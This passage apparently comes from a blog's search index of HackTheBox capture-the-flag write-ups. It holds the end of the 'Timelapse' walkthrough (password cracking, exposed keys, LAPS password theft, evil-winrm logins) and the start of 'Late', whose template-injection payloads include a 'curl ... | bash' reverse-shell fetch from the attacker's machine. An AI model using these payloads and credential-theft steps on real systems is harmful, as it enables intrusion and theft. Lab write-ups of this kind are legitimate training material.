13:06:10Z)135/tcp  open  msrpc         syn-ack Microsoft Windows RPC139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds? syn-ack464/tcp  open  kpasswd5?     syn-ack593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0636/tcp  open  tcpwrapped    syn-ack3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269/tcp open  tcpwrapped    syn-ackService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7h59m55s| p2p-conficker: |   Checking for Conficker.C or higher...|   Check 1 (port 59069/tcp): CLEAN (Timeout)|   Check 2 (port 32357/tcp): CLEAN (Timeout)|   Check 3 (port 22130/udp): CLEAN (Timeout)|   Check 4 (port 22941/udp): CLEAN (Timeout)|_  0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode: |   3.1.1: |_    Message signing enabled and required| smb2-time: |   date: 2022-08-14T13:06:35|_  start_date: N/ARead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Aug 14 01:07:22 2022 -- 1 IP address (1 host up) scanned in 89.99 secondsThere are multiple ports open. The domain name of the box is timelapse.htb.EnumerationSMBThe SMB port is open. So let’s try anonymous access to the shares.$ smbclient --no-pass -L //10.10.11.152        Sharename       Type      Comment        ---------       ----      -------        ADMIN$          Disk      Remote Admin        C$              Disk      Default share        IPC$            IPC       Remote IPC        NETLOGON        Disk      Logon server share         Shares          Disk              SYSVOL          Disk      Logon server share Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup availableWe can see that we have access to share with the name Shares. I have checked it. It contains a few files here.smbclient //10.10.11.152/SharesEnter WORKGROUP\\kali's password: Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Mon Oct 25 11:39:15 2021  ..                                  D        0  Mon Oct 25 11:39:15 2021  Dev                                 D        0  Mon Oct 25 15:40:06 2021  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021                6367231 blocks of size 4096. 1293866 blocks availablesmb: \\&gt; cd Devsmb: \\Dev\\&gt; ls  .                                   D        0  Mon Oct 25 15:40:06 2021  ..                                  D        0  Mon Oct 25 15:40:06 2021  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021                6367231 blocks of size 4096. 1293011 blocks availablesmb: \\Dev\\&gt; get winrm_backup.zip getting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)smb: \\Dev\\&gt; cd ..smb: \\&gt; ls  .                                   D        0  Mon Oct 25 11:39:15 2021  ..                                  D        0  Mon Oct 25 11:39:15 2021  Dev                                 D        0  Mon Oct 25 15:40:06 2021  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021cd                6367231 blocks of size 4096. 1293011 blocks availablesmb: \\&gt; cd HelpDesksmb: \\HelpDesk\\&gt; ls  .                                   D        0  Mon Oct 25 11:48:42 2021  ..                                  D        0  Mon Oct 25 11:48:42 2021  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021                6367231 blocks of size 4096. 1293011 blocks availablesmb: \\HelpDesk\\&gt; mget *Get file LAPS.x64.msi? ygetting file \\HelpDesk\\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (70.6 KiloBytes/sec) (average 63.9 KiloBytes/sec)Get file LAPS_Datasheet.docx? ygetting file \\HelpDesk\\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (37.5 KiloBytes/sec) (average 60.3 KiloBytes/sec)Get file LAPS_OperationsGuide.docx? ygetting file \\HelpDesk\\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (143.9 KiloBytes/sec) (average 75.3 KiloBytes/sec)Get file LAPS_TechnicalSpecification.docx? ygetting file \\HelpDesk\\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (48.8 KiloBytes/sec) (average 73.8 KiloBytes/sec)smb: \\HelpDesk\\&gt; ls  .                                   D        0  Mon Oct 25 11:48:42 2021  ..                                  D        0  Mon Oct 25 11:48:42 2021  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021                6367231 blocks of size 4096. 1292905 blocks availablesmb: \\HelpDesk\\&gt; cd ..smb: \\&gt; ls  .                                   D        0  Mon Oct 25 11:39:15 2021  ..                                  D        0  Mon Oct 25 11:39:15 2021  Dev                                 D        0  Mon Oct 25 15:40:06 2021  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021                6367231 blocks of size 4096. 1292905 blocks availablesmb: \\&gt; exitChecking the LAPS files didn’t provide any entry point.The winrm_backup.zip  file is password protected. I used fcrackzip to crack the password.$ fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt                                                                                     PASSWORD FOUND!!!!: pw == supremelegacyWe found the password , let’s check the zip file$ unzip winrm_backup.zip                                                                                                                                   Archive:  winrm_backup.zip[winrm_backup.zip] legacyy_dev_auth.pfx password:   inflating: legacyy_dev_auth.pfx    We got a PFX file. The PFX file is password protected however we can crack it with the john. First, we need to convert it to PFX to john format.Converting this pfx file to John compatible hash using pfx2john$ pfx2john *.pfx &gt;&gt; hash.txt$ john hash.txt -w=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])Cost 1 (iteration count) is 2000 for all loaded hashesCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusthuglegacy       (legacyy_dev_auth.pfx)     1g 0:00:01:04 DONE (2022-08-14 01:44) 0.01558g/s 50369p/s 50369c/s 50369C/s thuglife06..thug211Use the \"--show\" option to display all of the cracked passwords reliablySession completed. The password for the pfx file is thuglegacy.Using OpenSSL we can extract the cert and private key from the PFX file.$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes Enter Import Password:$ cat priv-key.pem Bag Attributes    Microsoft Local Key set: &lt;No Values&gt;    localKeyID: 01 00 00 00     friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b    Microsoft CSP Name: Microsoft Software Key Storage ProviderKey Attributes    X509v3 Key Usage: 90 -----BEGIN PRIVATE KEY-----MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLzTSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3topwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsboRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzDMEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzWfAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9jPJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnLGNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmUIfvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegIZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7obtTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b06jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/rc2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+XTTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8A5ZZvI+GsHhm0Oab7PEWlRY=-----END PRIVATE KEY-----$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem                                                                                     Enter Import Password:$ cat certificate.pem                                                                                                                                      Bag Attributes    localKeyID: 01 00 00 00 subject=CN = Legacyyissuer=CN = Legacyy-----BEGIN CERTIFICATE-----MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADASMRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og00E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAbYX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcsyOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AXDBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYerC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqam966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F03KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txGhqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbhnx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA-----END CERTIFICATE-----Copy the certificate and private key to different files.cert.pem$ cat cert.pem                                                                                                                                             -----BEGIN CERTIFICATE-----MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADASMRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og00E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAbYX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcsyOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AXDBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYerC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqam966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F03KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txGhqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbhnx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA-----END CERTIFICATE-----private.pem$ cat private.pem-----BEGIN PRIVATE KEY-----MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLzTSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3topwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsboRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzDMEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzWfAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9jPJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnLGNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmUIfvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegIZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7obtTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b06jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/rc2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+XTTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8A5ZZvI+GsHhm0Oab7PEWlRY=-----END PRIVATE KEY-----Now we can login to box using this two files.$ evil-winrm -S -k private.pem -c cert.pem -i 10.10.11.152                                                                                                 Evil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionWarning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; ExploitationFootholdWhile checking the files I found powershell history file.*Evil-WinRM* PS C:\\Users\\legacyy\\appdata\\roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine&gt; type ConsoleHost_history.txtwhoamiipconfig /allnetstat -ano |select-string LIST$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}get-aduser -filter * -properties *exitAs we can see that it contain the password for svc_deploy user. By repeting the commands we can execte the commands.*Evil-WinRM* PS C:\\Users\\legacyy\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline&gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck*Evil-WinRM* PS C:\\Users\\legacyy\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline&gt; $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force*Evil-WinRM* PS C:\\Users\\legacyy\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline&gt; *Evil-WinRM* PS C:\\Users\\legacyy\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline&gt; $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) *Evil-WinRM* PS C:\\Users\\legacyy\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}timelapse\\svc_deployChecking for group memberships using net user,*Evil-WinRM* PS C:\\Users\\legacyy\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}User name                    svc_deployFull Name                    svc_deployCommentUser's commentCountry/region code          000 (System Default)Account active               YesAccount expires              NeverPassword last set            10/25/2021 12:12:37 PMPassword expires             NeverPassword changeable          10/26/2021 12:12:37 PMPassword required            YesUser may change password     YesWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   8/21/2022 10:56:24 AMLogon hours allowed          AllLocal Group Memberships      *Remote Management UseGlobal Group memberships     *LAPS_Readers         *Domain UsersThe command completed successfully.So this user svc_deploy is a member of LAPS_Readers group using which we can extract Local Administrator password.*Evil-WinRM* PS C:\\Users\\legacyy\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}PSComputerName              : localhostRunspaceId                  : edc4c2e1-27e9-4370-958d-fc6691daeb26DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htbDNSHostName                 : dc01.timelapse.htbEnabled                     : Truems-Mcs-AdmPwd               : 9}AW2N7j6&amp;008t9IT;(1VcT[ms-Mcs-AdmPwdExpirationTime : 133060001290240516Name                        : DC01ObjectClass                 : computerObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98fSamAccountName              : DC01$SID                         : S-1-5-21-671920749-559770252-3318990721-1000UserPrincipalName           :PSComputerName    : localhostRunspaceId        : edc4c2e1-27e9-4370-958d-fc6691daeb26DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htbDNSHostName       :Enabled           : TrueName              : DB01ObjectClass       : computerObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659dSamAccountName    : DB01$SID               : S-1-5-21-671920749-559770252-3318990721-1606UserPrincipalName :PSComputerName    : localhostRunspaceId        : edc4c2e1-27e9-4370-958d-fc6691daeb26DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htbDNSHostName       :Enabled           : TrueName              : WEB01ObjectClass       : computerObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683SamAccountName    : WEB01$SID               : S-1-5-21-671920749-559770252-3318990721-1607UserPrincipalName :PSComputerName    : localhostRunspaceId        : edc4c2e1-27e9-4370-958d-fc6691daeb26DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htbDNSHostName       :Enabled           : TrueName              : DEV01ObjectClass       : computerObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814caSamAccountName    : DEV01$SID               : S-1-5-21-671920749-559770252-3318990721-1608UserPrincipalName :We get the password of the Administrator user 9}AW2N7j6&amp;008t9IT;(1VcT[.Using the password we can login to the box as a administrator user.$ evil-winrm -u 'Administrator' -p '9}AW2N7j6&amp;008t9IT;(1VcT[' -i 10.10.11.152  -SEvil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionWarning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;"
  },
  
  {
    "title": "HackTheBox: Late WriteUp",
    "url": "/posts/HackTheBox-Late-WriteUp/",
    "categories": "HackTheBox, Easy",
    "tags": "",
    "date": "2022-08-09 00:00:00 +0530",
    





    "snippet": "Late is the HackTheBox easy box. Which start with finding the subdomain. The subdomain has upload option, which converts the image to text. It is vulnerbale to STTI.Using it we get the RCE. For privilege escalation, we are required to enumerate files in the victim machine owned by the user and modify a script that will be executed by root whenever we SSH into the machine.Recon:Nmap:PORT   STATE SERVICE REASON  VERSION22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF|_http-title: Late - Best online image tools| http-methods: |_  Supported Methods: GET HEAD|_http-server-header: nginx/1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThere are two open port.Port 80:The homepage of the website has a static webpage. In the FAQ section I have found a subdomain.I have added the entry of subdomain in /etc/hosts to resolve the hostname.$ cat /etc/hosts127.0.0.1       localhost127.0.1.1       kali10.10.11.156    late.htb images.late.htb# The following lines are desirable for IPv6 capable hosts::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersimages.late.htbThe subdomain has the image upload functionality, which converts the uploaded images to text.In title we can see that the Flask framework is used to convert the image to text.FootholdWe have to upload the image file, for that I wrote a simple python code to convert the  text to image.from PIL import Image, ImageDraw, ImageFontdef getSize(txt, font):    testImg = Image.new('RGB', (1, 1))    testDraw = ImageDraw.Draw(testImg)    return testDraw.textsize(txt, font)if __name__ == '__main__':    fontname = \"RobotoSlab-VariableFont_wght.ttf\"    fontsize = 30       text = \"\"\"payload\"\"\"        colorText = \"black\"    colorOutline = \"red\"    colorBackground = \"white\"    font = ImageFont.truetype(fontname, fontsize)    width, height = getSize(text, font)    img = Image.new('RGB', (width+100, height+100), colorBackground)    d = ImageDraw.Draw(img)    d.text((2, height/2), text, fill=colorText, font=font)    #d.rectangle((0, 0, width+3, height+3), outline=colorOutline)        img.save(\"test.png\")Since the application is flask, first thing I tried is template injection. I have used simple payload{7*7}In below image we can see that it retrun the 49.RCETo get the command execution I used the following payload.{{cycler.__init__.__globals__.os.popen('id').read()}}from PIL import Image, ImageDraw, ImageFontdef getSize(txt, font):    testImg = Image.new('RGB', (1, 1))    testDraw = ImageDraw.Draw(testImg)    return testDraw.textsize(txt, font)if __name__ == '__main__':    fontname = \"RobotoSlab-VariableFont_wght.ttf\"    fontsize = 30           text = \"\"\"{{ cycler.__init__.__globals__.os.popen('id').read() }}\"\"\"            colorText = \"black\"    colorOutline = \"red\"    colorBackground = \"white\"    font = ImageFont.truetype(fontname, fontsize)    width, height = getSize(text, font)    img = Image.new('RGB', (width+100, height+100), colorBackground)    d = ImageDraw.Draw(img)    d.text((2, height/2), text, fill=colorText, font=font)    #d.rectangle((0, 0, width+3, height+3), outline=colorOutline)        img.save(\"test.png\")Created the image using above code. After uploading it we got the command execution.Reverse shellThe below script will make a curl request to our http server from their it will fetch the revserse shell content and execute the code.{{ cycler.__init__.__globals__.os.popen(\"curl http://10.10.14.47 | bash\").read() }}from PIL import Image, ImageDraw, ImageFontdef getSize(txt, font):    testImg = Image.new('RGB', (1, 1))    testDraw = ImageDraw.Draw(testImg)    return testDraw.textsize(txt, font)if __name__ == '__main__':    fontname = \"RobotoSlab-VariableFont_wght.ttf\"    fontsize = 30           text = \"\"\"{{ cycler.__init__.__globals__.os.popen(\"curl http://10.10.14.47 | bash\").read() }}\"\"\"        colorText = \"black\"    colorOutline = \"red\"    colorBackground = \"white\"    font = ImageFont.truetype(fontname, fontsize)    width, height = getSize(text, font)    img = Image.new('RGB', (width+100, height+100), colorBackground)    d = ImageDraw.Draw(img)    d.text((2, height/2), text, fill=colorText, font=font)    #d.rectangle((0, 0, width+3, height+3), outline=colorOutline)        img.save(\"test.png\")User flagIn home dir of svc_acc we found id_rsa.svc_acc@late:~/.ssh$ cat id_rsacat id_rsa-----BEGIN RSA PRIVATE 